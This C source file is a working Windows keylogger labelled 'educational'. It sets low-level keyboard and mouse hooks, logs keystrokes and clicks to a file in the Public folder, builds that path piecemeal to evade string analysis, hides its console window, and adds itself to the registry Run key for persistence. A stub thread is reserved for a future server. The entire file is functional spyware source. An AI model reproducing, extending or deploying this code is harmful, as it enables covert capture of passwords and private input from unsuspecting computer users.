#include <stdio.h>
#include <windows.h>
#include <Windowsx.h>
#include <processthreadsapi.h>
#include <stdlib.h>
#include <winuser.h>
#include <string.h>
#include <sys/stat.h>
#include <stdbool.h>
#include <time.h>
#include <fcntl.h>



#define VERSION 0x1

int memoryPointerOffset;
char* memoryBuffer;


char* get_timestamp(){
	SYSTEMTIME lt;
	GetLocalTime(&lt);
	char* timestamp = malloc(128);
	int sec = lt.wSecond;
	int min = lt.wMinute;
	int hour = lt.wHour;
	int month = lt.wMonth;
	int day = lt.wDay;
	int year = lt.wYear;
	memset(timestamp, 0, 128);
	char* buffer = malloc(10);
	memset(buffer, 0, 10);
	itoa(sec, buffer, 10);
	strcat(timestamp, buffer);
	strcat(timestamp, " ");
	itoa(min, buffer, 10);
	strcat(timestamp, buffer);
	strcat(timestamp, " ");
	itoa(hour, buffer, 10);
	strcat(timestamp, buffer);
	strcat(timestamp, " ");
	itoa(day, buffer, 10);
	strcat(timestamp, buffer);
	strcat(timestamp, " ");
	itoa(month, buffer, 10);
	strcat(timestamp, buffer);
	strcat(timestamp, " ");
	itoa(year, buffer, 10);
	strcat(timestamp, buffer);
	strcat(timestamp, " ");
	return timestamp;
}

bool file_exists(char *filename) {
	struct stat   buffer;   
	return (stat (filename, &buffer) == 0);
}

void create_file(char* path){
	char* data = malloc(1024);
	memset(data, 0, 1024);
	*(data) =  'J'; // Signature start
	*(data + 1) = 'M';
	*(data + 2) = (char)0;
	*(data + 3) = (char)0;
	*(data + 4) = 'K';
	*(data + 5) = 'L';
	*(data + 6) = 'G'; // Signature end
	*(data + 7) = (char)0;
	*(data + 8) = (char)0;
	*(data + 9) = (char)VERSION; // Version data
	*(data + 10) = (char)0;
	*(data + 11) = (char)0;
	memcpy(data+64, get_timestamp(), 128); 
	*(data + 1000) = (char)0;
	int file = open(path, O_WRONLY | O_CREAT | O_BINARY, 0777);
	write(file, data, 1024);
	free(data);
	close(file);
}

void begin_section(){
	*(memoryBuffer) = 'B'; // For start of buffer
	*(memoryBuffer + 1) = 'F';
	memoryPointerOffset = 2;
}

void save_logs(){
	// I have seperated the path like this so that the path is not directly visible using strings
	char* path = malloc(100);
	memset(path, 0, 100);
	strcat(path, "C:\\");
	strcat(path, "Users\\");
	strcat(path, "Public\\");
	strcat(path, "");
	strcat(path, "log.klg");
	if(!file_exists(path)){
		create_file(path);
	}
	int file = open(path, O_WRONLY | O_APPEND | O_BINARY, 0777);
	write(file, memoryBuffer, 4096);
	close(file);
	memset(memoryBuffer, 0, 4096);
	memoryPointerOffset = 0;
	begin_section();
	free(path);
}

void log_event(char eventType, char* value, char valueLength){
	int total_length = (int)valueLength + 2;
	if(total_length + memoryPointerOffset >= 4096){
		save_logs();
	}
	char* buffer = malloc(total_length);
	*(buffer) = eventType;
	*(buffer + 1) = valueLength;
	memcpy(buffer+2, value, valueLength);
	memcpy(memoryBuffer + memoryPointerOffset, buffer, total_length);
	memoryPointerOffset += total_length;
	free(buffer);
}

LRESULT CALLBACK mouse_hook(int nCode, WPARAM wParam, LPARAM lParam){
	MSLLHOOKSTRUCT *data = (MSLLHOOKSTRUCT *)lParam;
	POINT mouse_point = data->pt;
	long mouseX = mouse_point.x;
	long mouseY = mouse_point.y;
	long timeStamp = data->time;
	long flag = data->flags;
	//printf("mouse_hook :\nPOS: (%ld, %ld)\nTimeStamp: %ld\n\n", mouseX, mouseY, timeStamp);
	char* buffer = malloc(24);
	memset(buffer, 0, 5);
	for (int i = 0; i < 8; i++)
	{
		buffer[i] = ((mouseX >> (8 * i)) & 0XFF);
	}
	for (int i = 0; i < 8; i++)
	{
		buffer[i + 8] = ((mouseY >> (8 * i)) & 0XFF);
	}
	for (int i = 0; i < 8; i++)
	{
		buffer[i + 16] = ((timeStamp >> (8 * i)) & 0XFF);
	}
	switch(wParam){
		case WM_LBUTTONDOWN:{
			log_event('M', buffer, 24);
			break;
		}
		case WM_LBUTTONUP:{
			log_event('W', buffer, 24);
			break;
		}
		case WM_MOUSEMOVE:{
			// For now I dont have any intention for using this!
			break;
		}
		case WM_MOUSEWHEEL:{
			log_event('H', buffer, 24);
			break;
		}
	}
	free(buffer);
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK keyboard_hook(int nCode, WPARAM wParam, LPARAM lParam){
	KBDLLHOOKSTRUCT *data = (KBDLLHOOKSTRUCT *)lParam;
	long keyCode = data->vkCode;
	long scanCode = data->scanCode;
	long timeStamp = data->time;
	long flag = data->flags;
	char* buffer = malloc(24);
	memset(buffer, 0, 5);
	for (int i = 0; i < 8; i++)
	{
		buffer[i] = ((keyCode >> (8 * i)) & 0XFF);
	}
	for (int i = 0; i < 8; i++)
	{
		buffer[i + 8] = ((scanCode >> (8 * i)) & 0XFF);
	}
	for (int i = 0; i < 8; i++)
	{
		buffer[i + 16] = ((timeStamp >> (8 * i)) & 0XFF);
	}
	switch(wParam){
		case WM_KEYDOWN:{
			//printf("keyboard_hook (DN) :\nKeyCode: %ld\nScanCode: %ld\nTimeStamp: %ld\n\n", keyCode, scanCode, timeStamp);
			log_event('D', buffer, 24);
			break;
		}
		case WM_KEYUP:{
			//printf("keyboard_hook (UP) :\nKeyCode: %ld\nScanCode: %ld\nTimeStamp: %ld\n\n", keyCode, scanCode, timeStamp);
			log_event('U', buffer, 24);
			break;
		}
	}
	free(buffer);
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD WINAPI setup_hooks(LPVOID args){
	//printf("setting up hooks ...\n");
	HINSTANCE handle = GetModuleHandle(NULL);
	if (!handle)
	{
		return 1;
	}
	HHOOK keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)keyboard_hook, handle, 0);
	HHOOK mouseHook = SetWindowsHookExA(WH_MOUSE_LL, (HOOKPROC)mouse_hook, handle, 0);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) != 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(keyboardHook);
}

DWORD WINAPI setup_server(LPVOID serverSate){
	// For future use
	Sleep(5000);
}

int start_up(int argc, char** argv, char** envp){
	char* serverSate = malloc(1);
	*serverSate = 1;
	HANDLE coreThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)setup_hooks, (LPVOID)argv[0], 0, NULL);
	HANDLE serverThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)setup_server, (LPVOID)serverSate, 0, NULL);
	if (coreThread)
	{
		int return_state = WaitForSingleObject(coreThread, INFINITE);
		*serverSate = 0;
		return return_state;
	}
	return 0;
}

void on_kill(){
	save_logs();
}

void consent(){
	const int result = MessageBox(NULL, "This is an educational Keylogger!\n\nIf you click ok you are reponsible for what happens with your computer!", "Are you sure?",  MB_YESNO);

	switch (result)
	{
		case IDYES:
    	return;
		break;
		case IDNO:
		exit(0);
		break;
	}
}

void persist(){
	char* path = malloc(100);
	memset(path, 0, 100);
	strcat(path, "C:\\");
	strcat(path, "Users\\");
	strcat(path, "Public\\");
	strcat(path, "");
	strcat(path, "log.klg");
	if(file_exists(path)){
		return;
	}
	consent();
	char* selfPath = malloc(100*sizeof(char));
	GetModuleFileName(NULL, selfPath, 100*sizeof(char));
	HKEY runKey;
	DWORD dontcare;
	char value[1000];
	strcat(value, "");
	strcat(value, selfPath);
	strcat(value, "");
	int rval = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &runKey, &dontcare);
	if (rval != ERROR_SUCCESS) {
		//printf("Error in creating Key! %d\n", rval);
	}
	if (RegSetValueExA(runKey, "KLG Service", 0, REG_SZ, (BYTE*)value, (strlen(value) + 1) * sizeof(char)) != ERROR_SUCCESS) {
		//printf("Error in setting Key!\n");
	}
	RegCloseKey(runKey);
}

int main(int argc, char** argv, char** envp){
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	persist();
	memoryBuffer = malloc(4096);
	memoryPointerOffset = 0;
	begin_section();
	atexit(on_kill);
	start_up(argc, argv, envp);
}